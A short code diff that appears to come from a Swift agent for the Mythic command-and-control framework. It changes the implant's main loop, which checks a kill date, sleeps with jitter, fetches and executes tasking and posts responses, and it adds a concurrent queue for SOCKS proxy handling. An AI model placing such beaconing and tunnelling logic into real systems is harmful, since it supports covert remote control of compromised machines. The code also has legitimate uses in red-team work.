@@ -13,16 +13,24 @@ if (!encryptedKeyExchange())
     exit(0)
 }
 
+
 // Begin main program execution: check kill date, sleep, get tasking from Mythic, execute tasking from Mythic, post tasking to Mythic
 var jobs = JobList()
+
+let queue = DispatchQueue(label: "", qos: .utility, attributes: .concurrent)
+queue.async {
+    socksMsgList.thread = Thread.current
+    handleMutexMapModifications()
+}
+
 while(true)
 {
     checkKillDate()
     sleepWithJitter()
+
     do {
-        try getTasking(jobList: jobs)
+        try getTaskingAndPostResponse(jobList: jobs)
         executeJob(jobList: jobs)
-        postResponse(jobList: jobs)
     }
     catch {
     }
